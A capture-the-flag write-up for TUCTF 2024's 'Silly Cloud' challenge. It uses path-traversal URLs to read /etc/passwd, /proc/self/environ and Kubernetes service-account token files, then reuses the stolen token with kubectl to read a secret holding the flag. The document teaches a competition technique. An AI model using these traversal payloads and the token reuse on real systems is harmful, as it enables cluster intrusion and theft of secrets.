---
title: "Silly Cloud - TUCTF 2024"
category: "cloud"
subcategory: "kubernetes"
type: "writeup"
tags: ["cloud", "directory-traversal", "kubernetes", "kubectl", "chinese-remainder", "path-traversal", "jwt", "tuctf", "tuctf-2024", "2024", "ctf-writeup"]
summary: "We can see this interface when we access the challenge."
source:
  name: "CTFtime writeup #39836"
  url: "https://ctftime.org/writeup/39836"
original_source: "https://kitz24.github.io/2025/02/15/HackerOps/"
ctf:
  name: "TUCTF 2024"
  year: 2024
  challenge: "Silly Cloud"
---

## Metadata

- **CTF:** TUCTF 2024
- **Task:** Silly Cloud
- **Author team:** bi0skochi
- **CTFtime tags:** cloud, directory-traversal, kubernetes, kubectl
- **CTFtime:** <https://ctftime.org/writeup/39836>
- **Original writeup:** <https://kitz24.github.io/2025/02/15/HackerOps/>

---
# Oh Boy, This was a rollercoaster

\-----

  
> All i knew before doing this challenge was how to do directory traversal attacks, the rest I learnt on the go, if you dont know what that is then its worth looking it up. The rest I will explain using the best of my abilities.

\-----

### Accessing the challenge:

\-----

![](<https://imgur.com/LHXVbsS.png>)

\-----

We can see this interface when we access the challenge. Inspecting the code does not give us anything interesting, trying to use any of the buttons to access the services asks us to deploy which gives us this kind of error log:

\-----

![](<https://i.imgur.com/FKibAxh.png>)

\-----

The thing that immediately caught my eye was the url for this:

> <https://silly-cloud.tuctf.com/logs?service=registry>

You can see that there is a possibility of a path traversal attack here, the registry file being accessed can be seen by the users. Lets try to access something else and see what happens:

\-----

><https://silly-cloud.tuctf.com/logs?service=flag.txt>  
```  
Error: [Errno 2] No such file or directory: 'logs/flag.txt'  
```

\-----

this means that the our attack is working, lets find try to get the previous directory using '../'

\-----

> <https://silly-cloud.tuctf.com/logs?service=../flag.txt>

![](<https://i.imgur.com/m9dji2K.png>)

\-----

Well that was a tease, lets keep lookin further.

\-----

We can use ../ multiple times to reach the root directory '/' this will allow us to access all sorts of files residing in a linux system, i found a bunch of stuff, nothing useful yet tho:

> <https://silly-cloud.tuctf.com/logs?service=../../../../etc/passwd>

```  
root:x:0:0:root:/root:/bin/bash  
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin  
bin:x:2:2:bin:/bin:/usr/sbin/nologin  
sys:x:3:3:sys:/dev:/usr/sbin/nologin  
sync:x:4:65534:sync:/bin:/bin/sync  
games:x:5:60:games:/usr/games:/usr/sbin/nologin  
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin  
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin  
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin  
...  
```

Although even after searching various files nothing was leading to a flag I decided to get the environment variables of this sytem, typically stored at etc/environment

> <https://silly-cloud.tuctf.com/logs?service=../../../../etc/environment>

\-----

But this was EMPTY, which is strange so after looking at other ways to find environment variables led me to this super sus file "proc/self/environ" which holds current process environment data:

\-----

> <https://silly-cloud.tuctf.com/logs?service=../../../../proc/self/environ>

```  
PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin�HOSTNAME=silly-cloud-6cc798ddbb-p9jzd�LANG=C.UTF-8�GPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696D�PYTHON_VERSION=3.10.16�PYTHON_SHA256=bfb249609990220491a1b92850a07135ed0831e41738cf681d63cf01b2a8fbd1�SECRETS_NAMESPACE=secret-namespace�DEV_CLUSTER_ADDR=<https://7b9fc16d-5421-47b3-ab64-83dfee3050eb.k8s.ondigitalocean.com>�ALIEN_INTERFERENCE_SERVICE_PORT_HTTP=8000�ALIEN_INTERFERENCE_PORT_8000_TCP_PORT=8000�KRAKEN_SERVICE_PORT_CUSTOM=8888�NEC_ARCANE_PORT=tcp://10.108.54.113:8888�TECHNO_ORACLE_SERVICE_HOST=10.108.62.236�LIBER_TEA_HERO_PORT_8000_TCP_PORT=8000�MED_GRAPH_PORT=tcp://10.108.50.190:8000�MY_FIRST_SECRET_SERVICE_HOST=10.108.42.65�MY_FIRST_SECRET_SERVICE_PORT=8000�ALIEN_INTERFERENCE_SERVICE_HOST=10.108.33.153�KUBERNETES_SERVICE_PORT=443�KRAKEN_PORT_8888_TCP_PORT=8888�LIBER_TEA_HERO_SERVICE_PORT_HTTP=8000�SHOPPING_TIME_SERVICE_HOST=10.108.51.92�SILLY_CLOUD_SERVICE_PORT=8000�SILLY_CLOUD_PORT_8000_TCP=tcp://10.108.37.227:8000�LIBER_TEA_HERO_PORT=tcp://10.108.57.38:8000�NEC_ARCANE_SERVICE_HOST=10.108.54.113�NEC_ARCANE_SERVICE_PORT_CUSTOM=8888�NEC_ARCANE_PORT_8888_TCP_PROTO=tcp�BLOG_HUNTING_SERVICE_PORT_HTTP=8000�BLOG_HUNTING_PORT_8000_TCP_PORT=8000�ALIEN_INTERFERENCE_PORT_8000_TCP_ADDR=10.108.33.153�TECHNO_ORACLE_PORT_8000_TCP_PORT=8000�KUBERNETES_PORT_443_TCP_PROTO=tcp�KRAKEN_PORT_8888_TCP_ADDR=10.108.34.164�SIMPLER_CIPHER_SERVICE_HOST=10.108.46.75�KUBERNETES_PORT_443_TCP_PORT=443�SIMPLER_CIPHER_PORT_8888_TCP_ADDR=10.108.46.75�MED_GRAPH_PORT_8000_TCP=tcp://10.108.50.190:8000�SIMPLER_CIPHER_PORT_8888_TCP_PROTO=tcp�SIMPLER_CIPHER_PORT_8888_TCP_PORT=8888�MED_GRAPH_PORT_8000_TCP_PROTO=tcp�ALIEN_INTERFERENCE_PORT=tcp://10.108.33.153:8000�TECHNO_ORACLE_PORT_8000_TCP=tcp://10.108.62.236:8000�SHOPPING_TIME_SERVICE_PORT=8000�SHOPPING_TIME_SERVICE_PORT_HTTP=8000�SIMPLER_CIPHER_SERVICE_PORT_CUSTOM=8888�BLOG_HUNTING_PORT_8000_TCP=tcp://10.108.38.146:8000�MY_FIRST_SECRET_PORT=tcp://10.108.42.65:8000�MY_FIRST_SECRET_PORT_8000_TCP=tcp://10.108.42.65:8000�SHOPPING_TIME_PORT_8000_TCP_ADDR=10.108.51.92�SILLY_CLOUD_PORT_8000_TCP_PORT=8000�MY_FIRST_SECRET_PORT_8000_TCP_ADDR=10.108.42.65�TECHNO_ORACLE_SERVICE_PORT=8000�KUBERNETES_PORT=tcp://10.108.32.1:443�LIBER_TEA_HERO_SERVICE_PORT=8000�LIBER_TEA_HERO_PORT_8000_TCP=tcp://10.108.57.38:8000�SHOPPING_TIME_PORT_8000_TCP=tcp://10.108.51.92:8000�SIMPLER_CIPHER_SERVICE_PORT=8888�NEC_ARCANE_PORT_8888_TCP_PORT=8888�BLOG_HUNTING_PORT=tcp://10.108.38.146:8000�SILLY_CLOUD_SERVICE_HOST=10.108.37.227�SILLY_CLOUD_PORT_8000_TCP_ADDR=10.108.37.227�NEC_ARCANE_PORT_8888_TCP=tcp://10.108.54.113:8888�BLOG_HUNTING_SERVICE_PORT=8000�BLOG_HUNTING_PORT_8000_TCP_PROTO=tcp�KUBERNETES_PORT_443_TCP=tcp://10.108.32.1:443�KRAKEN_SERVICE_PORT=8888�KRAKEN_PORT_8888_TCP_PROTO=tcp�SHOPPING_TIME_PORT=tcp://10.108.51.92:8000�MED_GRAPH_SERVICE_PORT=8000�TECHNO_ORACLE_PORT=tcp://10.108.62.236:8000�KUBERNETES_PORT_443_TCP_ADDR=10.108.32.1�MED_GRAPH_SERVICE_PORT_HTTP=8000�SILLY_CLOUD_SERVICE_PORT_HTTP=8000�ALIEN_INTERFERENCE_SERVICE_PORT=8000�TECHNO_ORACLE_SERVICE_PORT_HTTP=8000�MED_GRAPH_SERVICE_HOST=10.108.50.190�BLOG_HUNTING_SERVICE_HOST=10.108.38.146�SILLY_CLOUD_PORT_8000_TCP_PROTO=tcp�MY_FIRST_SECRET_PORT_8000_TCP_PROTO=tcp�ALIEN_INTERFERENCE_PORT_8000_TCP=tcp://10.108.33.153:8000�TECHNO_ORACLE_PORT_8000_TCP_PROTO=tcp�TECHNO_ORACLE_PORT_8000_TCP_ADDR=10.108.62.236�MED_GRAPH_PORT_8000_TCP_ADDR=10.108.50.190�NEC_ARCANE_PORT_8888_TCP_ADDR=10.108.54.113�SIMPLER_CIPHER_PORT=tcp://10.108.46.75:8888�SIMPLER_CIPHER_PORT_8888_TCP=tcp://10.108.46.75:8888�NEC_ARCANE_SERVICE_PORT=8888�KRAKEN_SERVICE_HOST=10.108.34.164�KRAKEN_PORT=tcp://10.108.34.164:8888�LIBER_TEA_HERO_PORT_8000_TCP_PROTO=tcp�LIBER_TEA_HERO_PORT_8000_TCP_ADDR=10.108.57.38�SHOPPING_TIME_PORT_8000_TCP_PROTO=tcp�SILLY_CLOUD_PORT=tcp://10.108.37.227:8000�MY_FIRST_SECRET_PORT_8000_TCP_PORT=8000�ALIEN_INTERFERENCE_PORT_8000_TCP_PROTO=tcp�KUBERNETES_SERVICE_HOST=10.108.32.1�KUBERNETES_SERVICE_PORT_HTTPS=443�MED_GRAPH_PORT_8000_TCP_PORT=8000�MY_FIRST_SECRET_SERVICE_PORT_HTTP=8000�KRAKEN_PORT_8888_TCP=tcp://10.108.34.164:8888�LIBER_TEA_HERO_SERVICE_HOST=10.108.57.38�SHOPPING_TIME_PORT_8000_TCP_PORT=8000�BLOG_HUNTING_PORT_8000_TCP_ADDR=10.108.38.146�HOME=/nonexistent�  
```

\-----

Seems like we reached our first checkpoint, because this file contains lot of stuff that we will definitely need. To start with, we use this interesting link  
> <https://7b9fc16d-5421-47b3-ab64-83dfee3050eb.k8s.ondigitalocean.com>  
```  
{  
"kind": "Status",  
"apiVersion": "v1",  
"metadata": {},  
"status": "Failure",  
"message": "forbidden: User \"system:anonymous\" cannot get path \"/\"",  
"reason": "Forbidden",  
"details": {},  
"code": 403  
}  
```

\-----

A quick AI search tells us that this is a "Kubernetes API Response". And well if you dont know Kubernetes well its basically the thing that's powering ctf challenges, you know that "start instance" which creates a netcat link to the challenge only you can access and separates itself from others? Yea thats Kubernetes, it makes containers which helps make unique and separate instances for everyone. Read more on it here: <https://kubernetes.io/docs/concepts/overview/>

\-----

Now one of the ways to access the Kubernetes cloud service in the simplest manner is without using a proxy for which we need 3 things: the namespace, token and 'ca.crt' certificate. Thankfully the path to find it is same in every machine and here it is:  
```  
<https://silly-cloud.tuctf.com/logs?service=../../../../var/run/secrets/kubernetes.io/serviceaccount/ca.crt>  
<https://silly-cloud.tuctf.com/logs?service=../../../../var/run/secrets/kubernetes.io/serviceaccount/token>  
<https://silly-cloud.tuctf.com/logs?service=../../../../var/run/secrets/kubernetes.io/serviceaccount/namespace>  
```

\-----

It will give you a jwt token, a namespace and a certificate. Now lets pop these credentials into a kubectl config file at ~/.kube/config  
You can use any name for cluster, context, and user fields.

```  
$ kubectl config view  
apiVersion: v1  
clusters:  
\- cluster:  
certificate-authority: ./ca.crt  
server: <https://7b9fc16d-5421-47b3-ab64-83dfee3050eb.k8s.ondigitalocean.com/>  
name: challenges  
contexts:  
\- context:  
cluster: challenges  
namespace: challenges  
user: Kitz  
name: Kitz  
current-context: Kitz  
kind: Config  
preferences: {}  
users:  
\- name: Kitz  
user:  
token: REDACTED

```

\-----

Break into the cloud and use "kubectl auth can-i --list" to list the permissions you have in this cloud.

```  
$ kubectl auth can-i --list  
Resources Non-Resource URLs Resource Names Verbs  
[selfsubjectreviews.authentication.k8s.io](http://selfsubjectreviews.authentication.k8s.io) [] [] [create]  
[selfsubjectaccessreviews.authorization.k8s.io](http://selfsubjectaccessreviews.authorization.k8s.io) [] [] [create]  
[selfsubjectrulesreviews.authorization.k8s.io](http://selfsubjectrulesreviews.authorization.k8s.io) [] [] [create]  
[/.well-known/openid-configuration/] [] [get]  
[/.well-known/openid-configuration] [] [get]  
[/api/*] [] [get]  
[/api] [] [get]  
[/apis/*] [] [get]  
[/apis] [] [get]  
[/healthz] [] [get]  
[/healthz] [] [get]  
[/livez] [] [get]  
[/livez] [] [get]  
[/openapi/*] [] [get]  
[/openapi] [] [get]  
[/openid/v1/jwks/] [] [get]  
[/openid/v1/jwks] [] [get]  
[/readyz] [] [get]  
[/readyz] [] [get]  
[/version/] [] [get]  
[/version/] [] [get]  
[/version] [] [get]  
[/version] [] [get]  
  
```

You can access any of these using "kubectl get --raw /\<nameofthingtoaccess\>"  
Now the problem is i did see inside all of these but couldnt find anything resembling flag. After an eternity of searching I came back to the /proc/self/environ file where I spotted this:

```  
63cf01b2a8fbd1�SECRETS_NAMESPACE=secret-namespace�DEV_CLUSTER_A  
```

\------  
So theres a secret namespace? Lets see if we have access to it specifically using '-n secret-namespace'

```  
$ kubectl auth can-i --list -n secret-namespace  
Resources Non-Resource URLs Resource Names Verbs  
[selfsubjectreviews.authentication.k8s.io](http://selfsubjectreviews.authentication.k8s.io) [] [] [create]  
[selfsubjectaccessreviews.authorization.k8s.io](http://selfsubjectaccessreviews.authorization.k8s.io) [] [] [create]  
[selfsubjectrulesreviews.authorization.k8s.io](http://selfsubjectrulesreviews.authorization.k8s.io) [] [] [create]  
[/.well-known/openid-configuration/] [] [get]  
[/.well-known/openid-configuration] [] [get]  
[/api/*] [] [get]  
[/api] [] [get]  
[/apis/*] [] [get]  
[/apis] [] [get]  
[/healthz] [] [get]  
[/healthz] [] [get]  
[/livez] [] [get]  
[/livez] [] [get]  
[/openapi/*] [] [get]  
[/openapi] [] [get]  
[/openid/v1/jwks/] [] [get]  
[/openid/v1/jwks] [] [get]  
[/readyz] [] [get]  
[/readyz] [] [get]  
[/version/] [] [get]  
[/version/] [] [get]  
[/version] [] [get]  
[/version] [] [get]  
secrets [] [top-secret-flag] [get]

```

\------

Oh its coming down now, lets access the flag immediately using this command:

```  
$ kubectl get secret top-secret-flag -n secret-namespace -o json #the -o json will give more descriptive and bigger output  
{  
"apiVersion": "v1",  
"data": {  
"flag": "VFVDVEZ7M3Zlbl9tMDRyXzUxbGx5X2QzZjR1bDc1fQo="  
},  
"kind": "Secret",  
"metadata": {  
"annotations": {  
"[kubectl.kubernetes.io/last-applied-configuration](http://kubectl.kubernetes.io/last-applied-configuration)": "{\"apiVersion\":\"v1\",\"data\":{\"flag\":\"VFVDVEZ7M3Zlbl9tMDRyXzUxbGx5X2QzZjR1bDc1fQo=\"},\"kind\":\"Secret\",\"metadata\":{\"annotations\":{},\"name\":\"top-secret-flag\",\"namespace\":\"secret-namespace\"},\"type\":\"Opaque\"}\n"  
},  
"creationTimestamp": "2025-01-21T04:55:03Z",  
"name": "top-secret-flag",  
"namespace": "secret-namespace",  
"resourceVersion": "70667",  
"uid": "3b6b280e-170a-442d-bab1-baffd4fde4d8"  
},  
"type": "Opaque"  
}  
  
```

The flag is a alphanumeric string ending with '='. This is a dead giveaway that its a base64 encryption. Lets decrypt it using cmd or cyberchef and we are done!

```  
$ echo "VFVDVEZ7M3Zlbl9tMDRyXzUxbGx5X2QzZjR1bDc1fQo=" | base64 -d  
TUCTF{3ven_m04r_51lly_d3f4ul75}  
```

Thanks for reading! Baiii baii~
